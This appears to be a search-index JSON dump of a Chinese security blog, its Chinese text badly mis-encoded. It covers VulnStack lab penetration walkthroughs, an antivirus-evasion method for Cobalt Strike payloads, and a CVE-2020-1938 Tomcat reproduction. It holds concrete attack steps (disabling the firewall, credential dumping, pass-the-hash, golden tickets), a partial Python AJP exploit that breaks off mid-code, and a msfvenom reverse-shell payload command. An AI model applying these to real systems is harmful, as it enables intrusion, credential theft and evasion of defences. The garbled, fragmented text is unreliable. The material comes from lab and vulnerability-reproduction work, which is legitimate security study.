æŸ¥çœ‹åŸŸå†…ä¸»æœºï¼š æŸ¥çœ‹åŸŸç®¡ï¼š dump å¯†ç ï¼š ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:4:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 1 é¶åœº","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"æ¨ªå‘ç§»åŠ¨ DC ä¸Šçº¿åï¼Œä½¿ç”¨ hashdump dump krbtgt NTLM Hashï¼š åˆ¶ä½œé»„é‡‘ç¥¨æ®ï¼š ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:4:1","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 1 é¶åœº","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"é€šè¿‡æ›¿æ¢ cobaltstrike ä¸­è‡ªå¸¦ loader è¿›è¡Œå…æ€","date":"2020-04-02","objectID":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/","tags":["æ¸—é€æµ‹è¯•","å…æ€"],"title":"é€šè¿‡æ›¿æ¢ cobaltstrike ä¸­è‡ªå¸¦ loader è¿›è¡Œå…æ€","uri":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"é€šè¿‡æ›¿æ¢ cobaltstrikes ä¸­è‡ªå¸¦ loader è¿›è¡Œå…æ€ ","date":"2020-04-02","objectID":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/:0:0","tags":["æ¸—é€æµ‹è¯•","å…æ€"],"title":"é€šè¿‡æ›¿æ¢ cobaltstrike ä¸­è‡ªå¸¦ loader è¿›è¡Œå…æ€","uri":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"åŸå›  å¯¹ cobaltstrike ç”Ÿæˆçš„ artifact å…æ€çš„æ–¹å¼ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„åŠæ³•æ˜¯ç”Ÿæˆ shellcodeï¼Œç„¶åå†è‡ªå·±å®ç°ä¸€ä¸ª loader æ¥åŠ è½½ shellcodeã€‚ä¹‹å‰åœ¨è¯»cobaltstrike ç”Ÿæˆ artifact çš„ä»£ç çš„æ—¶å€™è§‰å¾—æ–¹å¼å¾ˆæœ‰æ„æ€ï¼Œä½œè€…å…ˆå†™äº†ä¸ªloaderï¼Œç„¶åé€šè¿‡å°†ç”Ÿæˆçš„ shellcode patch è¿› loader çš„æ–¹å¼æ¥ç”Ÿæˆ artifactã€‚ æ€è½¯é™æ€æŸ¥æ€è¿™ç§ç—…æ¯’ï¼Œé¦–å…ˆæ˜¯æ‰¾ shellcode çš„ç‰¹å¾ç‚¹å’Œ artifact æ¨¡æ¿çš„ç‰¹å¾ç‚¹ã€‚æ‰€ä»¥æˆ‘ä»¬å¦‚æœè‡ªå·±ç¼–å†™ä¸€ä¸ª loader æ¥æ›¿æ¢ cobaltstrike è‡ªå¸¦çš„ loaderï¼Œè¾¾åˆ°ä¸€ä¸ªå…æ€æ•ˆæœã€‚ æ–‡ç« çš„é‡ç‚¹ä¸æ˜¯è¿‡æ€è½¯ï¼Œåªæ˜¯æ¦‚å¿µéªŒè¯ï¼Œç”¨åˆ°çš„æŠ€æœ¯ä¹Ÿä»…ä»…æ˜¯è‡ªå·±å®ç° loader ç„¶åç®€å•çš„å°† shellcode è¿›è¡Œ xor æ¥ç»•è¿‡ 360 å¯¹ shellcode çš„ç‰¹å¾æŸ¥æ€ã€‚ ","date":"2020-04-02","objectID":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/:1:0","tags":["æ¸—é€æµ‹è¯•","å…æ€"],"title":"é€šè¿‡æ›¿æ¢ cobaltstrike ä¸­è‡ªå¸¦ loader è¿›è¡Œå…æ€","uri":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å·¥å…·ä»‹ç» web ç‹—æ€»æ˜¯å¯¹äºŒè¿›åˆ¶å……æ»¡äº†å¥½å¥‡ï¼Œartifact ç”Ÿæˆçš„æ–¹å¼æ˜¯è¯» cobaltstrike çš„æ—¶å€™å­¦æ¥çš„ï¼Œæœ¬è½¯ä»¶åªæ˜¯åšæ¦‚å¿µéªŒè¯ã€‚æŠ„äº†å¾ˆå¤š cs çš„æºç ï¼Œä¸»è¦æ˜¯è§‰å¾— patch çš„å½¢å¼å¾ˆæœ‰æ„æ€ï¼Œæºç åœ¨å†™ç¬¬äºŒç¯‡æ–‡ç« çš„æ—¶å€™ä¼šä¸€èµ·ä¼ åˆ° github ä¸Šï¼Œjar åŒ…æ²¡æœ‰æ··æ·†ä¹Ÿå¯ä»¥è‡ªå·±åç¼–è¯‘ï¼Œè‡ªå·±å…ˆåŠ¨æ‰‹å°è¯•ä¸€ä¸‹ï¼Œå‚è€ƒæºç è‡ªå·±ç¼–å†™ loaderï¼Œæ›¿æ¢resource/artifact.exe è®© cobaltstrike ç”Ÿæˆå‡ºçš„ artifact.exe é»˜è®¤å°±æ˜¯å…æ€çš„ã€‚ é€‰æ‹©script console ç„¶åè¾“å…¥: x transform(shellcode(\"ä½ çš„Listeneråç§°\",\"x86\",false),\"array\") æ‰“å¼€chaos: å¤åˆ¶è¿›æ–‡æœ¬æ¡† ç„¶åç‚¹å‡»generate: é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶å¤¹ä¿å­˜ ç‚¹å‡»ä¸Šçº¿: ","date":"2020-04-02","objectID":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/:2:0","tags":["æ¸—é€æµ‹è¯•","å…æ€"],"title":"é€šè¿‡æ›¿æ¢ cobaltstrike ä¸­è‡ªå¸¦ loader è¿›è¡Œå…æ€","uri":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/"},{"categories":["é¶åœº"],"content":"VulnStack ATT\u0026CK 5 é¶åœºç»ƒä¹ è®°å½•","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"VulnStack ATT\u0026CK 5 é¶åœº ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:0:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æœé›† ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:1:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ç«¯å£æ‰«æ åˆ©ç”¨ nmap æ‰«æç«¯å£,å‘ç°å¼€å¯äº†ä¸¤ä¸ªç«¯å£: 80 å’Œ 3306 è®¿é—® 80 ç«¯å£ å‘ç°æ˜¯ thinkphp v5 çš„ç«™ éšä¾¿è®¿é—®ä¸€ä¸ªé”™è¯¯é¡µé¢å¾—åˆ°å…¶ç‰ˆæœ¬å·æ˜¯ 5.0.22 ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:1:1","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"æ¼æ´æœç´¢ searchsploit æœç´¢ç›¸å…³æ¼æ´ï¼š å°è¯•ä½¿ç”¨ EXP æ‰§è¡Œå‘½ä»¤ ipconfig, å¦‚ä¸‹å›¾æ‰€ç¤º: ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:1:2","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ æŸ¥çœ‹æƒé™ï¼š æŸ¥çœ‹ web ç›®å½•ï¼š å†™å…¥shellï¼š ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:2:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ç”Ÿæˆè¿œæ§ æ–°å»º listener ç”Ÿæˆ payload ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:2:1","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"ä¸Šä¼ è¿œæ§ è¿æ¥ webshellï¼š ä¸Šä¼ ï¼š æ‰§è¡Œï¼š åå¼¹å›çš„ shellï¼š æ‰§è¡Œ shell whoamiï¼š ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:2:2","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"æƒé™æå‡ å†æ–°å»ºä¸€ä¸ª listenerï¼Œåšä¸ºææƒç­‰æ“ä½œä½¿ç”¨ (smb å’Œ tcp éƒ½å¯ä»¥ï¼Œæˆ‘é€‰æ‹© tcp, smb é€‚åˆæ¨ªå‘) ä½œè€…åœ¨ cs4.0 ç§»é™¤äº†æ¼æ´expçš„ææƒï¼Œå¯åœ¨https://github.com/rsmudge/ElevateKit é‡æ–°æ·»åŠ åˆ° cs ä¸­ã€‚ ä½¿ç”¨çš„æ˜¯ ms14-058 æ¼æ´çš„ exp è¿›è¡Œææƒï¼š ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:3:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"æ¨ªå‘ç§»åŠ¨ é€šè¿‡ explore-Process List å…ˆæŸ¥çœ‹ä¸€ä¸‹è¿›ç¨‹ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æ€æ¯’è½¯ä»¶(åœ¨local systemæ“ä½œ) å‘ç°å¹¶æ²¡æœ‰æ€æ¯’è½¯ä»¶ï¼Œè¿™æ ·æˆ‘ä»¬æ—¥åçš„æ¨ªå‘ç§»åŠ¨æ´»åŠ¨å°†æ›´ä¸ºé¡ºåˆ©ã€‚ ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:4:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"å…³é—­é˜²ç«å¢™ ä½¿ç”¨å‘½ä»¤ netsh advfirewall set allprofiles state off å…³é—­é˜²ç«å¢™ ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:4:1","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"å†…ç½‘çš„ä¿¡æ¯æœé›† (å…ˆåœ¨local adminæ“ä½œ,å› ä¸ºsystemæƒé™çœ‹ä¸åˆ°ç™»å½•åŸŸ) è·å–å½“å‰ç™»å½•åŸŸ é€šè¿‡å‘½ä»¤ net config workstation è·å–ç™»å½•åŸŸ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå·¥ä½œç«™åŸŸæ˜¯ sun.comå¯ç°åœ¨ç™»å½•åŸŸæ˜¯ win7ã€‚å› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåŸŸç”¨æˆ·çš„è¿›ç¨‹æ¥è¿›è¡Œä¿¡æ¯æœé›† åœ¨æ­¤ä¹‹å‰å…ˆè°ƒç”¨ Logonpasswords æŠ“ä¸€æ³¢å¯†ç (åœ¨ local admin å’Œ local system ä¸Šæ“ä½œéƒ½å¯ä»¥) åˆ©ç”¨å¯†ç ï¼š ç¬¬ä¸€ç§:ä½¿ç”¨ make_token å»è°ƒç”¨ ç¬¬äºŒç§:ä½¿ç”¨ pth å‘½ä»¤ç”Ÿæˆä¸€ä¸ªæ–°çš„è¿›ç¨‹æ³¨å…¥è¿›å» ç¬¬ä¸‰ç§:ä½¿ç”¨ spawn as éœ€è¦ç”¨è¿™ä¸‰ç§æ–¹æ³•è°ƒç”¨æˆ‘ä»¬åˆšåˆšä»¥åŠæŠ“å–çš„å‡­è¯ä»¥ç»§ç»­å®Œå…¨ç›¸åº”çš„ä¿¡æ¯æ”¶é›†æ“ä½œ ç¬¬ä¸€ç§ï¼šMake_token Make_token æ˜¯åœ¨å½“å‰çš„ beacon ä¸Šè¿›è¡Œèº«ä»½ä¼ªé€  åœ¨å½“å‰ beacon ä¸Šï¼Œæ‚¨çš„æƒé™ã€æƒé™æˆ–æ ‡è¯†æ²¡æœ‰å˜åŒ–ã€‚ä½†æ˜¯ï¼Œå½“æ‚¨ä¸è¿œç¨‹èµ„æºäº¤äº’æ—¶ï¼Œä½¿ç”¨çš„æ˜¯æ‚¨ä¼ªé€ çš„èº«ä»½ã€‚ ä½¿ç”¨ rev2self å‘½ä»¤ä¸¢å¼ƒå£ä»¤ ç¬¬äºŒç§: PTH Pth ( pth ä¼šç”Ÿæˆä¸€ä¸ªè¿›ç¨‹ï¼Œç”Ÿæˆè¿‡åæˆ‘ä»¬éœ€è¦ steal_tokenï¼Œsteal_token è¿‡åä¹Ÿæ˜¯ä½¿ç”¨ rev2self ä¸¢å¼ƒå£ä»¤) ä½¿ç”¨å‘½ä»¤ steal_token 7912ï¼š ç¬¬ä¸‰ç§ï¼šSpawnas spawnas å‘½ä»¤ç”Ÿæˆå…·æœ‰å…¶ä»–ç”¨æˆ·å‡­æ®çš„ beacon: å½“ç„¶é™¤æ­¤ä»¥å¯ä»¥ç”¨ Processes inject å»ç›´æ¥æ³¨å…¥åˆ°æŸä¸ªç”¨æˆ·çš„è¿›ç¨‹(è¿™é‡Œçš„æ“ä½œéœ€è¦ system æƒé™ï¼Œåœ¨ local system è¿›è¡Œæ“ä½œ) æŸ¥çœ‹å†…ç½‘çš„ä¸»æœº/åŸŸä¸»æœº ä½¿ç”¨ net view æŒ‡ä»¤æŸ¥çœ‹å†…ç½‘çš„ä¸»æœº(åŠ åŸŸåå³ä¸ºæŸ¥çœ‹åŸŸä¸»æœº) æŸ¥çœ‹ä¿¡ä»»åŸŸ ä½¿ç”¨ net domain_trusts æŸ¥çœ‹ä¿¡ä»»åŸŸ æŸ¥çœ‹åŸŸå†…è®¡ç®—æœº ä½¿ç”¨ net computers {åŸŸçš„dnså,è¿™é‡Œæ˜¯sun.com} æŸ¥çœ‹åŸŸå†…è®¡ç®—æœºï¼š æŸ¥çœ‹åŸŸæ§ ä½¿ç”¨ net dclist {åŸŸåç§°,è¿™é‡Œæ˜¯sun} æŸ¥çœ‹åŸŸæ§: æŸ¥çœ‹åŸŸç®¡ç†å‘˜ ä½¿ç”¨ net group \\\\{åŸŸæ§å,è¿™é‡Œæ˜¯DC} domain admins æŸ¥çœ‹åŸŸç®¡ç†å‘˜: æŸ¥çœ‹åŸŸå’Œç”¨æˆ·çš„ sid ä½¿ç”¨ whoami /all æŸ¥çœ‹åŸŸå’Œç”¨æˆ·çš„sid: ä¿¡æ¯æ±‡æ€» åŸŸå:sun.com åŸŸç®¡ç†å‘˜:sun\\administrator åŸŸç”¨æˆ·:administratorï¼Œadminï¼Œleoå’Œä¸€ä¸ªkrbtgt åŸŸæ§:DC åŸŸæˆå‘˜:DCï¼ŒWin7 åŸŸæ§ip:192.168.138.138 ç”¨æˆ·sid:S-1-5-21-3388020223-1982701712-4030140183-1110 åŸŸsid:S-1-5-21-3388020223-1982701712-4030140183 å·²çŸ¥å‡­æ®: sun\\leo:123.com win7\\heart:123.com ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:4:2","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"åŸŸææƒ åˆ©ç”¨ ms14-068 åŸŸææƒ å¯¼å…¥ä¼ªé€ ç¼“å­˜: ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:5:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"æ¨ªå‘åˆ°åŸŸæ§ (åœ¨ domain user çš„ beacon ä¸Šæ“ä½œ) è¿™é‡Œåˆ›å»ºä¸€ä¸ª listener ä½œä¸ºæ¨ªå‘æ¼”ç¤ºï¼Œåå­—ä¸º Lateral Movement ï¼Œæˆ‘é€‰æ‹© smb_beacon æ›´å¥½ï¼Œsmb beacon èƒ½è¿‡é˜²ç«å¢™ï¼ŒåŠ¨é™å° (åœ¨ cs4.0 ä¸­ï¼Œæœ‰ jump å’Œ remote-exec å‘½ä»¤) ç‚¹å‡» View-Target: å› ä¸ºæˆ‘ä»¬å·²ç»æœ‰æƒé™è®¿é—®DCäº†ï¼Œç›´æ¥å‹¾é€‰ä¸‹é¢çš„ä½¿ç”¨å½“å‰å£ä»¤å³å¯: DC æˆåŠŸä¸Šçº¿ï¼š ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:6:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"æƒé™ç»´æŒ ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:7:0","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["é¶åœº"],"content":"é»„é‡‘ç¥¨æ® é¦–å…ˆå…ˆåˆ©ç”¨ logonpasswords æŠ“ä¸€æ³¢æ˜æ–‡(åœ¨åä¸ºDCçš„Beaconè¿›è¡Œæ“ä½œ) ä½¿ç”¨ dcsync å‘½ä»¤å¯¼å‡º krbtgt çš„ NTLM Hashï¼Œæˆ–è€…ï¼Œä½¿ç”¨ hashdump ä¹Ÿå¯ä»¥å¯¼å‡º hash ä¸ºäº†æ–¹ä¾¿äºå®è·µé»„é‡‘ç¥¨æ®ï¼Œæ‰‹åŠ¨ç”Ÿæˆäº†ä¸€ä¸ªæ–°çš„åŸŸç”¨æˆ·geekby: ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:7:1","tags":["å†…ç½‘é¶åœº","é¶åœº"],"title":"VulnStack ATT\u0026CK 5 é¶åœº","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2020-1938 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´å¤ç°","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","tags":["Tomcat","æ¼æ´å¤ç°"],"title":"CVE-2020-1938 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´å¤ç°","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"CVE-2020-1938 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´å¤ç° ","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:0:0","tags":["Tomcat","æ¼æ´å¤ç°"],"title":"CVE-2020-1938 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´å¤ç°","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´å¤ç° ","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:0","tags":["Tomcat","æ¼æ´å¤ç°"],"title":"CVE-2020-1938 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´å¤ç°","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º docker-compose.yml version: '2' services: tomcat: image: vulhub/tomcat:9.0.30 ports: - \"8080:8080\" - \"8009:8009\" å¯åŠ¨é•œåƒï¼š docker-compose up -d ","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:1","tags":["Tomcat","æ¼æ´å¤ç°"],"title":"CVE-2020-1938 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´å¤ç°","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"POC æ¥æºï¼šhttps://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC åŸä½œè€…çš„ poc åªèƒ½è¯»æ–‡ä»¶ï¼Œå°†åŸä½œè€… poc çš„ self.req_uri = req_uri æ”¹ä¸º self.req_uri = req_uri + \".jsp\" å³å¯æ–‡ä»¶åŒ…å«ï¼Œä»è€Œåå¼¹ shellã€‚ #!/usr/bin/env python import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string(s): if s is None: return struct.pack(\"\u003eh\", -1) l = len(s) return struct.pack(\"\u003eH%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \"\u003eh\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\"\u003ebbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\"\u003eH\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\"\u003ebbH\", 0x12, 0x34, len(res)) else: header = struct.pack(\"\u003ebbH\", 0x41, 0x42, len(res)) return header + res def send_and_receive(self, socket, stream): while True: data = self.serialize() socket.send(data) r = AjpResponse.receive(stream) while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS: r = AjpResponse.receive(stream) if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4: break class AjpForwardRequest(object): _, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(28) REQUEST_METHODS = {'GET': GET, 'POST': POST, 'HEAD': HEAD, 'OPTIONS': OPTIONS, 'PUT': PUT, 'DELETE': DELETE, 'TRACE': TRACE} # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) COMMON_HEADERS = [\"SC_REQ_ACCEPT\", \"SC_REQ_ACCEPT_CHARSET\", \"SC_REQ_ACCEPT_ENCODING\", \"SC_REQ_ACCEPT_LANGUAGE\", \"SC_REQ_AUTHORIZATION\", \"SC_REQ_CONNECTION\", \"SC_REQ_CONTENT_TYPE\", \"SC_REQ_CONTENT_LENGTH\", \"SC_REQ_COOKIE\", \"SC_REQ_COOKIE2\", \"SC_REQ_HOST\", \"SC_REQ_PRAGMA\", \"SC_REQ_REFERER\", \"SC_REQ_USER_AGENT\" ] ATTRIBUTES = [\"context\", \"servlet_path\", \"remote_user\", \"auth_type\", \"query_string\", \"route\", \"ssl_cert\", \"ssl_cipher\", \"ssl_session\", \"req_attribute\", \"ssl_key_size\", \"secret\", \"stored_method\"] def __init__(self, data_direction=None): self.prefix_code = 0x02 self.method = None self.protocol = None self.req_uri = None self.remote_addr = None self.remote_host = None self.server_name = None self.server_port = None self.is_ssl = None self.num_headers = None self.request_headers = None self.attributes = None self.data_direction = data_direction def pack_headers(self): self.num_headers = len(self.request_headers) res = \"\" res = struct.pack(\"\u003eh\", self.num_headers) for h_name in self.request_headers: if h_name.startswith(\"SC_REQ\"): code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + 1 res += struct.pack(\"BB\", 0xA0, code) else: res += pack_string(h_name) res += pack_string(self.request_headers[h_name]) return res def pack_attributes(self): res = b\"\" for attr in self.attributes: a_name = attr['name'] code = AjpForwardRequest.ATTRIBUTES.index(a_name) + 1 res += struct.pack(\"b\", code) if a_name == \"req_attribute\": aa_name, a_value = attr['value'] res += pack_string(aa_name) res += pack_string(a_value) else: res += pack_string(attr['value']) res += struct.pack(\"B\", 0xFF) return res def serialize(self): res = \"\" res = struct.pack(\"bb\", self.prefix_code, self.method) res += pack_string(self.protocol) res += pac","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:2","tags":["Tomcat","æ¼æ´å¤ç°"],"title":"CVE-2020-1938 Apache Tomcat AJP æ–‡ä»¶åŒ…å«æ¼æ´å¤ç°","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"åå¼¹ shell msfvenom ç”Ÿæˆ webshell msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 \u003e shell.txt ä¸Šä¼ 